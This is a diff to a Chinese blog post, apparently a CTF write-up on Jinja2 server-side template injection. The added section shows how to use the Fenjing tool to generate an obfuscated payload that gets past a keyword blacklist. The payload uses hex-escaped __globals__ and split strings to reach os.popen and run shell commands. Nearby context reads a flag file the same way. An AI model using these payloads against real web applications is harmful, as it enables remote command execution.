@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-09_14-04-59.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-09_14-05-46.png">
 <meta property="article:published_time" content="2025-07-18T12:03:54.000Z">
-<meta property="article:modified_time" content="2025-07-18T12:04:28.975Z">
+<meta property="article:modified_time" content="2025-07-21T07:31:23.553Z">
 <meta property="article:author" content="everythingis-ok">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/1344396-20200903130838384-1719222659.png">
@@ -244,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.9k 字
+          7.1k 字
         
       </span>
     
@@ -255,7 +255,7 @@
         
         
         
-          58 分钟
+          60 分钟
         
       </span>
     
@@ -736,6 +736,19 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; lipsum.__globals__[<span class="hljs-string">&quot;os&quot;</span>].popen(<span class="hljs-string">&#x27;cat /var/secret_flag&#x27;</span>).read() &#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-09_14-05-46.png" srcset="/img/loading.gif" lazyload alt="PixPin_2025-07-09_14-05-46"></p>
+<h2 id="使用焚靖"><a href="#使用焚靖" class="headerlink" title="使用焚靖"></a>使用焚靖</h2><p>把源代码中黑名单写入waf.txt，删除<code>&#123; &#125;</code>用__WAF绕关键字攻击__的方法读取关键字黑名单并生成绕过payload。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python -m fenjing crack-keywords -k waf.txt -o output.txt --command &#x27;ls /&#x27;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python -m fenjing   #启动crack功能<br>-k waf.txt	        #黑名单关键字文件（还可以是.py/.json）<br>--command&#x27;ls /&#x27;     #是你想要执行的系统命令<br>-o output.txt		#是输出文件名<br></code></pre></td></tr></table></figure>
+
+
+
+<p>得到的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;(cycler.next[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;p&#x27;&#x27;open&#x27;](&#x27;ls /&#x27;))[&#x27;r&#x27;&#x27;ead&#x27;]()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>把<code>&#123;&#123;` ` &#125;&#125;</code>分别替换为keywords就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;天命(cycler.next[&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;][&#x27;</span>o<span class="hljs-string">&#x27;&#x27;</span>s<span class="hljs-string">&#x27;][&#x27;</span>p<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-built_in">open</span><span class="hljs-string">&#x27;](&#x27;</span>ls /<span class="hljs-string">&#x27;))[&#x27;</span><span class="hljs-string">r&#x27;&#x27;</span>ead<span class="hljs-string">&#x27;]()难违&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
